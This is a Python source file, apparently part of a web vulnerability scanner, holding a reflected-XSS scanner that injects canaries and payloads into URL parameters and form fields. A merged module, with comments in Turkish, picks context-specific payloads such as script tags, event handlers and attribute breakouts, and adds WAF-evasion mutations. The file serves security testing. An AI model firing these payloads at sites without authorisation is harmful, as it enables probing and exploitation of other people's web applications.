import logging
import random
import string
from typing import List, Dict
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

from websecure.scanners.base import BaseScanner
from websecure.core.mutator import Mutator
from websecure.core.reporting import add_result

logger = logging.getLogger(__name__)

class XSSScanner(BaseScanner):
    """
    Robust Cross-Site Scripting (XSS) Scanner.
    Features:
    - Reflected XSS detection via canary injection
    - Context-aware payload selection (Smart System)
    - WAF Evasion/Polyglot support
    """

    name = "xss"
    phase = "offensive"

    def __init__(self, session=None, results: Dict = None, debug=False):
        super().__init__(session, results, debug)
        self.canary_prefix = "wsxss"

    def _gen_canary(self):
        token = "".join(random.choices(string.ascii_letters + string.digits, k=6))
        return f"{self.canary_prefix}{token}"

    def run(self, url: str | List[str], results: Dict = None, **kwargs):
        # Update results if provided (state sharing)
        if results is not None:
            self.results = results
            
        # 1. Scan URL parameters
        if isinstance(url, list):
            for u in url:
                self.scan_url(u)
        else:
            self.scan_url(url)
            
        # 2. Scan Forms (Deep Input Scan)
        pages_with_forms = self.results.get("forms_meta", [])
        if pages_with_forms:
            # Flatten: Extract all forms from all pages
            all_forms = []
            for page in pages_with_forms:
                if "forms" in page:
                    all_forms.extend(page["forms"])
            
            if all_forms:
                self.scan_forms(all_forms)



    def scan_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return

        logger.info(f"Scanning for XSS: {url}")
        
        # 1. Reflection Check (Canary)
        for param_name, _ in params:
            canary = self._gen_canary()
            # Simple reflection probe
            invoked = self._inject_param(url, param_name, canary)
            try:
                res = self.session.get(invoked, timeout=8)
                if canary in res.text:
                    # Reflected! Now try to break context
                    self._fuzz_xss(url, param_name)
            except Exception:
                pass

    def _fuzz_xss(self, url, param_name):
        """
        Detailed XSS fuzzing for a known reflected parameter.
        Uses Smart Payload Selection if available.
        """
        # 1. Get Smart Payloads
        # If we have analysis for this param, base class will handle it
        payloads = self.get_smart_payloads("xss", param_name)
        
        # Fallback if empty (shouldn't happen with defaults)
        if not payloads:
            payloads = [
                "<script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "'-alert(1)-'",
            ]
        
        # Add Polyglots (always good)
        payloads.extend(Mutator.mutate_polyglot("alert(1)"))
        
        # Validated Payloads Limit (optimization)
        # Random sample if too many
        if len(payloads) > 25:
             payloads = random.sample(payloads, 25)

        for p in payloads:
            # Maybe mutate
            if random.random() < 0.2:
                p_list = Mutator.mutate_xss(p)
                actual_p = random.choice(p_list) if p_list else p
            else:
                actual_p = p
                
            invoked = self._inject_param(url, param_name, actual_p)
            try:
                res = self.session.get(invoked, timeout=8)
                # Naive check: if payload returns exactly as is
                if actual_p in res.text:
                     self._report_vuln("Reflected XSS", url, param_name, actual_p)
                     break # Found one, good enough
            except Exception:
                pass

    def _inject_param(self, url: str, param_name: str, value: str) -> str:
        """Injects *value* into *param_name* in the URL query string."""
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        params[param_name] = value
        new_query = urlencode(params)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                           parsed.params, new_query, parsed.fragment))

    def scan_forms(self, forms: List[Dict]):
        """
        Iterates over discovered forms and injects XSS payloads into inputs.
        """
        logger.info(f"Scanning {len(forms)} forms for XSS (Deep Input)...")
        
        for form in forms:
            action = form.get("action")
            method = (form.get("method") or "GET").upper()
            inputs = form.get("inputs", [])
            
            if not action or not inputs:
                continue
                
            # Filter inputs to fuzz (Blacklist approach for maximum coverage)
            # Skip only functional/binary types. Fuzz everything else (text, number, tel, hidden, etc.)
            skipped_types = {"submit", "button", "image", "reset", "file", "checkbox", "radio"}
            fuzzable = [i for i in inputs if i.get("type", "text") not in skipped_types]

            
            for inp in fuzzable:
                p_name = inp.get("name")
                if not p_name: continue
                
                # Payload selection (Smart)
                payloads = self.get_smart_payloads("xss", p_name)
                if not payloads:
                    payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>"]
                
                # Limit payloads per form input to avoid explosion
                payloads = payloads[:5] 
                
                for payload in payloads:
                    # Construct request data
                    # We need to preserve other default values if possible
                    form_data = {i.get("name"): i.get("value", "") for i in inputs if i.get("name")}
                    
                    # Prepare injection
                    # Using base class helper would be ideal, but for now we manually construct to be precise with 'data' arg
                    req_kw = self.prepare_injection(action, p_name, payload, method, data=form_data)
                    
                    try:
                        # Send
                        if method == "POST":
                            res = self.session.post(req_kw.get("url", action), data=req_kw.get("data"), timeout=8)
                        else:
                            res = self.session.get(req_kw.get("url", action), timeout=8)
                            
                        # Check reflection
                        if payload in res.text:
                             self._report_vuln("Reflected XSS (Form/Body)", action, p_name, payload)
                             break # One vuln per param is enough
                    except Exception:
                        pass


    def _report_vuln(self, title, url, param, payload):
        entry = {
            "type": title,
            "severity": "High",
            "url": url,
            "parameter": param,
            "payload": payload,
            "proof": "Payload reflected in response"
        }
        self.add("offensive", entry)
        logger.warning(f"!!! {title} FOUND: {url} (Param: {param})")

def run(url, session=None, results=None, debug=False, **kwargs):
    scanner = XSSScanner(session, results, debug)
    scanner.run(url, results=results, **kwargs)


# ===========================================================================
# MERGED FROM: websecure/core/reflection.py
# Adaptive Reflection Analyzer — context-aware XSS payload selection
# ===========================================================================
# -*- coding: utf-8 -*-
"""
Adaptive Reflection Analyzer for WebSecure (Level 3)

Bu modül, bir input'un HTTP yanıtında nereye yansıdığını (HTML Body, Attribute, Script vb.) analiz eder.
Bu sayede "context-aware" payload seçimi yapılabilir.
"""

from __future__ import annotations
import re
from enum import Enum, auto
from typing import List, Optional, Tuple
from dataclasses import dataclass


class ReflectionType(Enum):
    NONE = auto()                   # Yansıma yok
    HTML_TEXT = auto()              # <div>INPUT</div>
    HTML_ATTR_DOUBLE = auto()       # <div class="INPUT">
    HTML_ATTR_SINGLE = auto()       # <div class='INPUT'>
    HTML_ATTR_UNQUOTED = auto()     # <div class=INPUT>
    SCRIPT_BLOCK = auto()           # <script>var x = "INPUT";</script>
    SCRIPT_QUOTED = auto()          # <script>var x = "INPUT";</script>
    COMMENT = auto()                # <!-- INPUT -->


@dataclass
class ReflectionPoints:
    canary: str
    contexts: List[ReflectionType]
    raw_response: str = ""


# =============================================================================
# REFLECTION ANALYSIS LOGIC
# =============================================================================

def analyze_reflection(response_text: str, canary: str) -> ReflectionPoints:
    """
    Verilen canary değerinin response içindeki konumlarını analiz eder.
    Basit regex-tabanlı parser kullanır (hız için).
    """
    if not response_text or canary not in response_text:
        return ReflectionPoints(canary, [ReflectionType.NONE], response_text)

    contexts = []
    
    # 1. Script Block Detection
    # Basitçe <script> tagleri arasını bulup orada var mı bakarız
    script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', response_text, re.DOTALL | re.IGNORECASE)
    in_script = False
    for block in script_blocks:
        if canary in block:
            in_script = True
            # Script içinde quote durumuna bak (basit heuristik)
            # "canary" veya 'canary'
            if f'"{canary}"' in block or f"'{canary}'" in block:
                contexts.append(ReflectionType.SCRIPT_QUOTED)
            else:
                contexts.append(ReflectionType.SCRIPT_BLOCK)
            break # Genelde 1 script yansıması yeterlidr
            
    if not in_script:
        # 2. Attribute Detection
        # class="canary" gibi
        # (["'])[^"']*?canary[^"']*?\1
        
        # Double Quote
        if re.search(f'="[^"]*{canary}[^"]*"', response_text):
            contexts.append(ReflectionType.HTML_ATTR_DOUBLE)
        # Single Quote
        elif re.search(f"='[^']*{canary}[^']*'", response_text):
            contexts.append(ReflectionType.HTML_ATTR_SINGLE)
        # Unquoted (zor ama deneyelim) - <div id=canary>
        elif re.search(f'=[^"\'\s>]*{canary}[^"\'\s>]*', response_text):
             contexts.append(ReflectionType.HTML_ATTR_UNQUOTED)
        
        # 3. Comment Detection
        elif re.search(f'<!--.*{canary}.*-->', response_text, re.DOTALL):
            contexts.append(ReflectionType.COMMENT)
            
        # 4. Fallback: HTML Text
        else:
            contexts.append(ReflectionType.HTML_TEXT)

    return ReflectionPoints(canary, list(set(contexts)), response_text)


# =============================================================================
# PAYLOAD SELECTION
# =============================================================================

def get_payloads_for_context(ctx: ReflectionType) -> List[str]:
    """
    Bulunan bağlama göre en etkili (Sniper) payload'ları döndürür.
    """
    if ctx == ReflectionType.HTML_TEXT:
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>"
        ]
    elif ctx == ReflectionType.HTML_ATTR_DOUBLE:
        return [
            '"><script>alert(1)</script>',
            '" onmouseover="alert(1)',
            '" autofocus onfocus="alert(1)'
        ]
    elif ctx == ReflectionType.HTML_ATTR_SINGLE:
        return [
            "'><script>alert(1)</script>",
            "' onmouseover='alert(1)",
            "' autofocus onfocus='alert(1)"
        ]
    elif ctx == ReflectionType.SCRIPT_BLOCK:
        return [
            ";alert(1);//",
            "alert(1);",
            "</script><script>alert(1)</script>" # Break out
        ]
    elif ctx == ReflectionType.SCRIPT_QUOTED:
        return [
            "';alert(1);//",
            '";alert(1);//',
            "\\';alert(1);//" # Escape escape?
        ]
    elif ctx == ReflectionType.COMMENT:
        return [
            "--> <script>alert(1)</script>"
        ]
        
    return [] # None
